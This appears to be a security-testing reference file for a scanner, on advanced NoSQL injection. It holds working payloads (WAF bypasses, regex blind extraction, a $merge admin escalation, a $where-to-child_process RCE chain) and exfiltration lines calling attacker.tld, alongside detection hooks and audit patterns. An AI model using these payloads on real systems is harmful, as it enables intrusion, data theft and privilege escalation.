---
name: nosql-injection-advanced-deep
description: NoSQL injection at advanced+expert depth — driver differentials, aggregation-pipeline injection depth, blind/OOB extraction, WAF/filter bypass classes, per-store sink depth, application-side vs server-side eval differential, and composite-chain construction
sibling: nosql_injection
load_when: scan_mode == "deep"
---

# NoSQL Injection — Advanced Depth

This is the advanced+expert deep sibling to `nosql_injection.md`. The base owns the class framing, PortSwigger taxonomy, primary operator-injection payloads per store (MongoDB, Redis, Elasticsearch, DynamoDB, Cassandra, CouchDB, Neo4j, plus DocumentDB), the $where JS injection primer with the sleep()-falsy nuance, the express-mongo-sanitize discussion with documented limitations, OWASP WSTG v4.2 probe set, and the primary chains. The novel+frontier sibling `nosql_injection_novel_deep.md` owns the Mongoose $where RCE chain CVE decomposition (CVE-2024-53900 + CVE-2025-23061 canonical version table), MongoDB 8.0 $where sandbox mechanism, and the CVEs that must be explicitly excluded from NoSQLi scope. This file owns the operational depth in between — driver behavior differentials, aggregation-pipeline injection depth, blind/OOB extraction methodology, per-store sink expansion, WAF-bypass classes, GraphQL variable injection depth, and composite-chain construction.

Load this file when the trivial `{$ne: null}` has been blocked, the target uses a hardened stack (schema-strict Mongoose + express-mongo-sanitize + typed field casts), the extraction is blind (no direct read-back), the injection surface is application-side rather than driver-side, or the chain requires composing NoSQLi with a downstream authorization/RCE class.

Every version-boundary claim referencing a specific CVE lives in the novel sibling per §2 CVE single-ownership; this file references CVEs by number + route only. Every mechanism claim is anchored to a primary source (MongoDB docs, PortSwigger research, OWASP WSTG v4.2, driver READMEs) or measured.

## Driver Behavior Differentials

Different MongoDB drivers handle operator objects differently. Knowing the target's driver narrows the reachable primitives.

**Node.js `mongodb` (official driver).** Accepts operator objects as-is. `find({field: {$ne: null}})` runs exactly as written. `$where` is enabled if `javascriptEnabled=true` on the server. The driver does no client-side interpretation of operators.

**Mongoose ODM (Node.js).** Layered on `mongodb`; schema enforcement is opt-in via `strict` mode. Two distinct code paths matter:
- **`Model.find/findOne` with a plain filter object** — schema-cast if `strict: true`; operator objects on schema-typed fields become the typed value (`{$ne: null}` cast to a String becomes the string `"[object Object]"` and does not match). Effective defense when configured.
- **`populate().match` filters** — evaluated application-side via the `sift` library. `sift` honors `$where` without MongoDB's server-side sandbox. See `nosql_injection_novel_deep.md § Mongoose $where RCE Chain — CVE-2024-53900 and CVE-2025-23061` for the CVE decomposition; the primitive class is Node.js RCE, not database-scoped.

**PyMongo (Python).** Accepts operator objects; the legacy `eval()` in some earlier versions is fatal (any string field passed to `eval` executes as Python). Modern PyMongo (4.x+) uses BSON directly. Schema enforcement is application-layer (pydantic, marshmallow) — no ODM equivalent to Mongoose's schema mode.

**Mongoid (Ruby).** Similar to Mongoose in spirit; whitelist-based query builder can be bypassed via the `Mongoid::Criteria#where` method with a raw hash. `$where` support is same as underlying driver.

**Java driver (mongo-java-driver).** Uses `Bson` builders; operator injection requires the application to construct raw `Document` objects from user input (rare in idiomatic Java code). When present, same primitives as Node.js.

**Prisma with MongoDB.** Prisma's typed API rejects arbitrary operators at compile time (Zod-adjacent enforcement); the injection surface narrows to any `$queryRaw`-adjacent raw-query APIs. Prisma's tagged-template `$queryRaw` DOES perform parameter escaping; the string-invocation `$queryRawUnsafe` does not.

Confirmation of the target's driver: server response headers (`Server:`, `X-Powered-By`), error stack traces (Node stack includes `mongodb` or `mongoose` package paths), the `/api/health` or `/api/version` endpoints if present, and dependency lockfile if source-available.

## Aggregation Pipeline Depth

`aggregate([stages])` accepts a pipeline of stages. Each stage is an object with its own operator surface, distinct from `find()`'s filter operators. Multi-stage aggregation is a rich injection surface.

**$match stage** — same operators as `find()` filter. Injection reads the same as basic operator injection.

**$project stage** — user-controlled `$project` field expressions can compute values via `$function` (in expression context), leak field values via projection with `$literal`, or expose internal fields via `_id: 0, hiddenField: 1`.

**$lookup stage — cross-collection pivot.** The highest-impact aggregation vector. User-controlled `$lookup.from` pivots the query to a different collection:
```json
[
  {"$match": {"userId": "victim"}},
  {"$lookup": {"from": "users", "localField": "userId", "foreignField": "_id", "as": "leak"}}
]
```
If the app expected `$lookup.from: "orders"` and the attacker controls it, the pivot reaches any collection the DB role permits — often `users`, `secrets`, `tokens`, `admin_events`. Extracted data returns embedded in the result set as the `leak` field.

Cross-tenant leakage is the archetypal impact: a multi-tenant SaaS where the aggregation is scoped by `tenantId` in `$match` but $lookup ignores tenant scoping — the pivot reads across tenants.

**$graphLookup stage** — recursive $lookup; can traverse relational chains without a WHERE-clause limit. High CPU cost + potential recursion-depth attack.

**$out and $merge — write primitives.** Aggregation stages that WRITE results to another collection. Attacker-controlled `$out` overwrites arbitrary collections with query results (destructive). `$merge` upserts based on a `whenMatched` policy — attacker can `merge` a computed document into `users` collection with admin fields set.

```json
[
  {"$match": {}},
  {"$addFields": {"role": "admin"}},
  {"$merge": {"into": "users", "whenMatched": "merge"}}
]
```
Every existing user in `users` gets `role: admin` merged in. Requires DB role with write access on target collection.

**$out for OOB extraction.** When `$out` can write to a collection accessible via a public endpoint (the app renders it), it becomes an OOB channel — extract cross-collection data by piping it through `$out` into a collection the app renders. Rare but real.

**$function in aggregation.** Server-side JavaScript function inside an expression context (`$expr`, `$project`, `$addFields`). Gated by `javascriptEnabled=true`. Reachable from any user-controlled aggregation stage:
```json
[
  {"$project": {
    "leak": {"$function": {"body": "function(doc){return db.users.findOne({role:'admin'})}", "args": [], "lang": "js"}}
  }}
]
```
Executes in the JS server-side sandbox. On MongoDB 8.0+ the sandbox blocks `db` access; on older versions the `db` global is available inside the function.

**Confirmation:** submit a benign aggregation payload observing result-set structure; then inject each stage class and observe differential behavior. `$lookup.from` change is the fastest confirmation (result-set gains a new field named per `as`).

## Blind Extraction — Depth

The base introduces the `$regex` character-by-character technique; here is the operational depth.

**Binary search over character space.**
```
Round 1: {"password": {"$regex": "^[a-m]"}}    → response A or B (bisect)
Round 2 (if A): {"password": {"$regex": "^[a-f]"}}
Round 3 (if A): {"password": {"$regex": "^[a-c]"}}
...
```
94 printable ASCII characters need ~7 requests per character via binary search vs 94 via linear enumeration. Automated with a small script: response-body diff, response-status differential, or timing differential as the oracle.

**Character-class shortcuts.** Test `[a-z]`, `[A-Z]`, `[0-9]`, `[^a-zA-Z0-9]` FIRST to narrow the class before bisecting within it. Reset tokens are hex or alphanumeric; API keys often mixed-case + underscore-hyphen; passwords vary.

**Length probe.** `{"password": {"$regex": "^.{N}$"}}` — bisect on N to determine field length before per-character extraction. Cuts the work by knowing where to stop.

**Prefix + suffix bisection.** Extract prefix and suffix in parallel:
```
{"password": {"$regex": "^known_prefix.[a-m]"}}   // continues from known prefix
{"password": {"$regex": "[a-m]$"}}                // last character
```

**Character escapes.** `$regex` uses JavaScript regex syntax: escape `[]{}()\.` etc. when the target field may contain them.

**Case-insensitive flag** widens matches:
```json
{"password": {"$regex": "^a", "$options": "i"}}
```

**Boolean-based blind without regex — via $where.** When `$regex` is filtered or the field type is not string:
```json
{"$where": "this.password[0] == 'a' || 'a'=='b'"}   // PortSwigger canonical
{"$where": "this.creditNum.startsWith('4111')"}
{"$where": "this.balance > 10000"}
```
Same binary-search pattern; boolean returned by the JS.

**Time-based blind with sleep()-falsy handling.**
- **Pure timing** (no result-set expected): `{"$where": "sleep(5000)"}` — observe latency, ignore empty response.
- **Timing + truthy predicate** (want a documented result-set): `{"$where": "sleep(5000) || true"}` — matches all documents AND induces delay. Rocket.Chat CVE-2023-28359 shape.
- **Conditional timing:** `{"$where": "if (this.role == 'admin') sleep(5000); true"}` — differential timing per record; enumerates matching records without direct read-back.

**Error-based extraction.** Force the driver to serialize a controlled expression that includes the target value:
```json
{"$where": "throw new Error(this.password)"}
```
On misconfigured targets, the error message reaches the response body verbatim. Frequently blocked by production error-handling middleware but present on legacy targets.

**Type-error extraction.** Force a type-mismatch error whose message includes the value:
```json
{"$where": "this.password.match(/(?<x>xxx)/); this.password.slice(9999999)"}
```
Some drivers include field values in stack traces.

## OOB Extraction Channels

Direct blind extraction is slow and observable. OOB channels move the extraction off the request-response cycle.

**$out to a readable collection.** Pipeline computes attacker-controlled fields and writes them to a collection the app renders publicly (or one the attacker can read via a subsequent operator injection). See § Aggregation Pipeline Depth above.

**Elasticsearch `_reindex` to attacker cluster.** Historically Elasticsearch's `_reindex` API accepted `remote.host` to reindex from a remote source — the reverse can be used to reindex TO an attacker-controlled Elasticsearch cluster. Version-boundary: fixed in 7.x with allowlist; verify current target's `reindex.remote.whitelist` setting. Note: CVE-2025-37727 is NOT this primitive — it is a passive audit-log CWE-532; see novel sibling.

**DNS lookup via `$where`.** If the target Node process has network access, `$where` payload can trigger DNS via `require('dns').lookup('${extracted}.${nonce}.oob.attacker.tld')`. The DNS query itself is the extraction channel — subdomain contains the extracted value. Only works on the application-side eval class (sift-driven $where in Node); MongoDB's server-side sandbox blocks network on 8.0+.

**HTTP callback.** Same shape: from application-side $where, `fetch('https://attacker.tld/x?data=' + extracted)`. Requires Node fetch reachability from the target.

**$lookup to an attacker-controlled Atlas cluster.** Ambitious variant: MongoDB Atlas federated queries allow cross-cluster reads. If misconfigured, attacker could set up a MongoDB cluster and use $lookup.from with a full connection string. Rare precondition (federated query enabled + attacker cluster whitelisted); flag if seen.

## GraphQL Variable Injection Depth

GraphQL is a common front-door for NoSQLi because resolvers often lift the variable object directly into a backing NoSQL filter.

**Introspection-first enumeration.**
```graphql
{ __schema { types { name inputFields { name type { name kind ofType { name } } } } } }
```
Enumerate input types whose fields accept `JSON`, `Any`, or an untyped `InputObject`. Those are the operator-injection candidates.

**Variable payloads by resolver type.**
```graphql
query Search($filter: UserFilter!) { user(filter: $filter) { id role } }
```
Variables:
```json
{"filter": {"username": {"$ne": null}, "role": "admin"}}
{"filter": {"$where": "return this.role === 'admin'"}}
{"filter": {"$or": [{}]}}   // matches all
```

**Alias abuse for parallelization.** GraphQL aliases let multiple probes fire in one request:
```graphql
{
  a: user(filter: {password: {$regex: "^a"}}) { id }
  b: user(filter: {password: {$regex: "^b"}}) { id }
  c: user(filter: {password: {$regex: "^c"}}) { id }
  ...
}
```
Extracts per-character candidates in parallel — significantly faster than sequential.

**Batching.** GraphQL batching (multiple queries in one POST) increases throughput similarly.

**Fragment injection.** If fragment names are user-controllable (rare), attacker can construct fragments that reach protected fields.

**Directive-based filter injection.** Custom `@filter(input: JSON)` directives that pass user input to a NoSQL filter — the JSON scalar bypasses type-checking, direct operator injection.

## Per-Store Sink Depth

Base names the primary sinks per store; here is the operational depth for each.

### MongoDB Sinks

Beyond `find`/`findOne`/`aggregate`:
- **`update` / `updateOne` / `updateMany`** — the *filter* argument accepts the same operators as `find`. Operator injection on filter allows updating documents beyond intent. The *update* argument accepts `$set`, `$unset`, `$inc`, `$rename` — user-controlled update field structure allows arbitrary document modification.
- **`bulkWrite`** — array of operations, each with a filter+update. Injection into any operation.
- **`deleteMany`** — filter injection allows unbounded deletion. `{}` deletes everything the driver's role permits.
- **`countDocuments` / `estimatedDocumentCount`** — filter injection gives a boolean/count oracle (blind extraction).
- **`distinct(field, filter)`** — user-controlled `field` argument reads any field name from any document matching filter. Cross-field disclosure without needing a projection injection.
- **`mapReduce`** (deprecated in 5.0 but still present) — map and reduce functions are attacker-controllable JS if user input reaches these arguments.

### Redis Sinks

Beyond command concatenation (base):
- **`EVAL`** — Redis command that executes Lua script. User-controlled script argument = arbitrary Lua execution. Redis Lua sandbox blocks OS calls but allows any Redis command. Attacker script can `redis.call('SET', 'admin_key', attacker_value)`.
- **`EVALSHA`** — same as EVAL but with a pre-loaded script hash; attacker with `EVAL` access can register scripts then invoke via SHA.
- **`FUNCTION LOAD` / `FUNCTION CALL`** (Redis 7+) — user-registered Lua/JS functions callable across sessions. Persistent server-side code injection.
- **`SUBSCRIBE`/`PSUBSCRIBE`** — no injection surface directly but a wildcard subscribe leaks all pub-sub traffic.
- **RESP protocol injection via `\r\n`** — see base for the command-smuggling shape.

### Elasticsearch Sinks

Beyond `query_string` / painless (base):
- **`_search` with `sort`** — sort field control can leak field ordering info.
- **`_reindex`** — see § OOB Extraction Channels for cross-cluster reindex.
- **`_scripts`** — stored scripts; user-controlled stored-script name + arguments can execute pre-registered painless scripts unexpectedly.
- **`_ingest` pipelines** — user-controlled ingest pipeline processors (JSON path expressions, script processors) enable script injection at index time.

### DynamoDB Sinks

Beyond PartiQL (base):
- **`ExecuteStatement`** — PartiQL entrypoint; parameter injection when values are concatenated instead of parameterized.
- **`Query` with `FilterExpression`** — expression injection into filter.
- **`UpdateItem` with `UpdateExpression`** — similar; attacker-controlled update expression can `SET role = 'admin'`.
- **Global secondary indexes** — pivoting queries across indexes without index-level access control.

### CouchDB Sinks

Beyond Mango and views (base):
- **`_all_docs?include_docs=true`** — unscoped read of every document in the database (auth-gated but often misconfigured).
- **`_bulk_docs`** — bulk upsert; attacker can inject documents with `_admin` roles if the auth layer trusts document content.
- **`_replicate`** — trigger replication to/from arbitrary URL. Attacker-controlled URL = SSRF + data exfil.
- **`_config`** (CouchDB 1.x, removed in 2.x — verify version) — legacy config-write endpoint; historical RCE surface via `os_daemons`.

### Neo4j Sinks

Beyond concatenated Cypher + APOC (base):
- **`neo4j-shell` / `cypher-shell` command injection** — if the app shells out to run Cypher via CLI, standard command-injection surfaces apply.
- **`apoc.load.jdbc`** — arbitrary JDBC URL; SSRF + data exfil via JDBC (Cassandra, Postgres, etc.).
- **`apoc.export.csv.query`** — write query results to arbitrary file path on the DB server. RCE via cronjob file, Python startup file, etc.
- **`apoc.trigger.add`** — persistent server-side triggers running on any DB event.

### Cassandra Sinks

Beyond concatenated CQL (base):
- **User-Defined Functions (UDFs)** — Cassandra allows Java/JavaScript UDFs if enabled. Attacker-registered UDF is server-side code execution.
- **Batch statements** — batch injection when statement list is concatenated.
- **`COPY` command** — allows importing/exporting data via CSV; misconfigured target can read/write arbitrary files.

## WAF & Filter Bypass Classes

Operator injection payloads have consistent surface signatures (`$ne`, `$gt`, `$where`, `{`, `}`); WAFs and sanitizers key on these. Bypass classes:

**Key-blocklist bypass — value-side.** Sanitizer strips keys starting with `$`; value-side JS payload survives:
```json
{"password": {"$regex": "^admin"}}     // BLOCKED — $regex is a key
{"password": "\\{$where: 'admin'\\}"}   // string value, sanitizer misses
```
The value-side needs the driver or downstream code to interpret the string as an operator, which requires a specific vulnerable pattern.

**Nested-operator bypass — top-level check only.** Sanitizer checks top-level keys against blocklist; nested `$where` survives:
```json
{"$or": [{"$where": "malicious JS"}]}       // top-level is $or; $where is nested
{"$and": [{"$or": [{"$where": "..."}]}]}    // deeper nesting
```
This is CVE-2025-23061's exact bypass class — the CVE-2024-53900 fix guarded top-level properties only. See `nosql_injection_novel_deep.md § Mongoose $where RCE Chain`.

**Key alias — operator equivalents.** Multiple operators reach the same primitive:
- `$ne` blocked → use `$nin: [target]`
- `$regex` blocked → use `$in: [regex...]` with pre-computed candidates, or `$where` with JS-side regex
- `$or` blocked → use `$nor` (negation) with computed complement, or `$and` with a false-clause
- `$where` blocked → use `$expr` + `$function` (aggregation context)

**Encoding.**
- URL-encode: `%24ne` = `$ne`, `%7B` = `{`, `%7D` = `}`, `%2E` = `.`
- Unicode variants for `$` (full-width `＄`, U+FF04) — the JSON parser handles Unicode but the sanitizer's regex may not.
- Nested URL-encoding for double-decoding parsers.

**Content-type switching.**
- WAF rule keyed on `application/json` → send as `application/x-www-form-urlencoded` with bracket notation.
- WAF rule keyed on request body → send in query string.
- WAF rule keyed on POST → send via PUT/PATCH if the endpoint accepts it.

**GraphQL variable bypass.** Payload inside a GraphQL variable often bypasses WAF rules that only inspect REST request bodies at the JSON-body level.

**Batch/alias bypass in GraphQL** — each alias submits an independent probe; a WAF that rate-limits by request count sees one request, not N.

**Character variant bypass.** Some WAFs match `\$where` (backslash-escaped $); the JSON parser dequotes to `$where` and hits the driver.

**Nested-key + timing bypass.** Fire the innocuous prefix in one request (build the query up to but not including the operator injection point); fire the operator injection in a later request that continues from the built query. Requires a stateful target.

## Second-Order NoSQL Injection

Second-order NoSQLi stores the payload in one request and triggers execution in a later, unrelated request path.

**Persistence sinks common in modern apps:**
- User profile fields (bio, notes, custom-attribute JSON blobs) stored and later merged into a query filter by a report/analytics pipeline.
- Search-index refresh jobs that read persisted config from a table and use it as a filter template.
- Notification systems that filter recipients by stored criteria — the stored criterion is attacker-controlled and interpreted as an operator object.
- Admin bulk-update tools that read a stored filter template and apply updates.

**Confirmation:** place a canary payload in the persistence layer, wait for the delayed trigger, observe an out-of-band callback or extracted-secret result at the endpoint the delayed pipeline outputs to.

**Detection audit:** grep the codebase for reads from persistence that flow into `find/findOne/aggregate/update` filters without operator-key sanitization. Any pipeline that reads a stored JSON blob and hands it to a query builder is a candidate.

## Confirmation Methodology — Advanced

Base names three states (echoed, executed, impact); advanced adds:

**Differential across drivers.** Same endpoint hit with two payloads that differ only in a driver-specific operator (`$expr` vs `$where`); differential in behavior indicates which driver is on the other side.

**Differential across channels.** Fire the same operator payload via JSON body, form body, query string, GraphQL variable. Differential across channels reveals which parser/middleware layer is unhardened.

**Type-cast bypass check.** Send `{"password": {"$ne": null}}` — if the response is 400 with a "cast error" message, the field is being cast to string (defense working). If 200 with unexpected data, cast is not happening or is bypassed.

**Null-vs-undefined-vs-empty-string.** `{$ne: null}` vs `{$ne: ""}` vs `{$exists: true}` vs `{$type: "string"}` — differential behavior reveals what values exist in the DB.

**MongoDB error fingerprint reference.** MongoDB error messages that CONFIRM injection:
- `MongoServerError: unknown top level operator: $xxx` — the driver reached MongoDB with an unknown operator; you have operator injection.
- `$where can only be applied at the top level` — you have $where injection but the target rejected the specific placement.
- `E11000 duplicate key error` — write injection reached the DB but hit a unique constraint.

Error messages that DO NOT confirm injection:
- `CastError: Cast to String failed` — Mongoose schema cast blocked the operator before the driver saw it.
- `ValidationError: Path xxx is required` — schema validation, unrelated to injection.
- Generic 500 from the app — could be anything; not evidence.

## False-Positive Discipline — Advanced

Beyond the base's list:

- **Cached responses.** A subsequent request may return the response the CDN/proxy cached from a previous non-injected request. Purge cache or fire an unique cache-buster before confirming.
- **Idempotent operators.** `{$exists: true}` on a required field returns everything; the "wow, all data returned" moment is trivial matching, not injection.
- **Response-shape coincidence.** If the target returns different responses for auth-fail vs auth-success by design and the injection payload happens to look like a valid user (very unlikely but possible), the auth-bypass appearance is spurious.
- **Load-balanced multi-shard MongoDB.** Differential behavior between requests may be shard routing, not injection. Repeat probes; consistency across N probes rules out shard variance.
- **Time-based blind on slow endpoint.** If the endpoint is naturally slow (5s baseline), a 5.5s response to a `sleep(500)` payload is not confirmation. Statistical baseline required (mean + stddev over ~30 probes).

## Composite Chain Construction

**Chain A — Auth bypass → admin API → cross-tenant IDOR:**
1. Base primitive: `{"username": {"$gt": ""}, "password": {"$gt": ""}}` returns first admin session.
2. Session token used to query `/admin/tenants` — full tenant list.
3. Per-tenant credential extraction via IDOR on `/admin/tenants/<id>/credentials`.
4. Route: `idor.md` for the post-auth cascade.

**Chain B — GraphQL introspection → operator injection → wide data exfil:**
1. Introspect schema, enumerate every input-object field typed as `JSON`/`Any`.
2. For each, submit `{$or: [{}]}` — matches all records.
3. Cross-reference with authenticated resolver output for full data extraction.
4. Route: `broken_function_level_authorization.md` for resolver authz gaps.

**Chain C — Mongoose populate().match → sift $where → Node.js RCE:**
1. Endpoint uses `Model.populate({path: 'related', match: userInput})`.
2. Submit `userInput = {"$or": [{"$where": "this.constructor.constructor('return process')().mainModule.require(\"child_process\").execSync('id')"}]}`.
3. Sift evaluates `$where` in Node.js; the polyglot function reaches process global and executes `child_process`.
4. Impact: RCE on the app host.
5. Route: `nosql_injection_novel_deep.md § Mongoose $where RCE Chain — CVE-2024-53900 and CVE-2025-23061` for the CVE-anchored version boundaries; `rce.md` for the post-RCE surface.

**Chain D — Aggregation $lookup pivot → cross-collection data extraction:**
1. Endpoint accepts a `pipeline` parameter for a reporting query.
2. Submit `[{$match: {}}, {$lookup: {from: "secrets", localField: "_id", foreignField: "userId", as: "leak"}}]`.
3. Result set contains `leak` field with per-user secrets.
4. Route: `idor.md` for the authorization framing (attacker-authorized to their own records; extracts others' via lookup).

**Chain E — Aggregation $merge write → privilege escalation:**
1. Same endpoint as D, but with `$merge` instead of `$lookup`.
2. Payload: `[{$match: {_id: "attackerUserId"}}, {$addFields: {role: "admin"}}, {$merge: {into: "users", whenMatched: "merge"}}]`.
3. Attacker's user record is upserted with `role: admin`.
4. Impact: privilege escalation.
5. Route: `broken_function_level_authorization.md` for the post-escalation surface.

**Chain F — Persistent stored payload → export-pipeline eval → RCE:**
1. Attacker sets profile bio (or similar persistence field) to `{$or: [{$where: "malicious JS"}]}`.
2. Nightly report pipeline reads bio into a Mongoose populate filter.
3. Same as Chain C but with a delayed trigger.
4. Impact: RCE in the report worker process.
5. Route: `§ Second-Order NoSQL Injection` above.

## Runtime Detection Instrumentation

**Node.js — wrap the mongodb driver's `find` / `aggregate` / `update` calls.**
Insert at target startup:
```javascript
const orig = require('mongodb').Collection.prototype.find;
require('mongodb').Collection.prototype.find = function (filter, ...rest) {
  console.error('NOSQLI-INSTR find on', this.collectionName, JSON.stringify(filter).slice(0, 500));
  return orig.call(this, filter, ...rest);
};
```
Every query logs its filter; injection payloads surface immediately with a stack trace to the vulnerable code path.

**Mongoose — hook `populate` and inspect the match filter.**
```javascript
const Query = require('mongoose').Query;
const origPopulate = Query.prototype.populate;
Query.prototype.populate = function (options) {
  if (options && options.match) {
    console.error('MONGOOSE-INSTR populate.match:', JSON.stringify(options.match).slice(0, 500));
  }
  return origPopulate.apply(this, arguments);
};
```
Reveals every populate match filter and, critically, whether attacker-controlled operators reach the sift-evaluated path.

**Elasticsearch — proxy the client's request logs.** Enable driver-level request logging (`log: 'trace'` in most clients) or intercept at the HTTP client layer. Log every DSL body; inspect for operator-injection-shaped input.

## Anti-Pattern Detection Playbook (White-Box)

Grep patterns for identifying vulnerable NoSQLi sinks at scale:

```
# Mongoose direct filter from user input
rg 'Model\.\w+\(\s*req\.(body|query|params)'
rg '\.find\(\s*(?:req\.body|req\.query|input|userData)'
rg '\.aggregate\(\s*(?:req\.body|req\.query|input)'
rg 'populate\s*\([^)]*match\s*:'

# Native driver with unfiltered filter
rg '\.collection\(.*\)\.(find|findOne|updateOne|deleteMany|aggregate)'

# GraphQL resolver lifting variable into filter
rg 'resolve.*(args\.\w+|input)\s*=>\s*.*(find|aggregate|findOne)'

# CouchDB Mango selector from input
rg '_find.*selector.*(req|input|body)'

# Cypher string concat
rg 'session\.run\(\s*(?:f|`)[^)]*\$\{'
rg '(?:cypher|query)\s*=\s*[fF][`"].*\$\{'

# Redis command string concat
rg 'redis\.(execute_command|eval)\s*\(\s*(?:f|`)[^)]*\$\{'

# Elasticsearch script.source from user
rg 'script.*source.*(req|input|userData)'

# PartiQL string concat
rg 'PartiQL.*(f|`)[^)]*\$\{'
rg 'ExecuteStatement.*[+`]'
```

For each hit, verify the source of user input actually reaches the sink without intervening sanitization (schema cast, express-mongo-sanitize, driver-level parameterization).

## Summary

NoSQL injection's advanced surface is the operator-injection sink diversity across drivers, aggregation stages, and stores — each with a distinct operator vocabulary that a single-key blocklist misses. The application-side eval class (Mongoose sift → Node.js RCE) is the highest-impact primitive; confirm it against the current Mongoose CVE chain (routed to novel). Blind extraction is fast via binary-search regex; OOB channels via $out/$reindex/DNS/HTTP move extraction off the request path when direct read-back is dead. WAF bypasses lean on nested-operator, key-alias, and content-type switching; multi-operator payloads (Chain C-F) chain the primitive into RCE, PE, or cross-tenant data disclosure. Match the target's specific driver + version + schema-cast configuration before payload construction — many defenses are drivers' own type-cast behavior, not app-level sanitization.
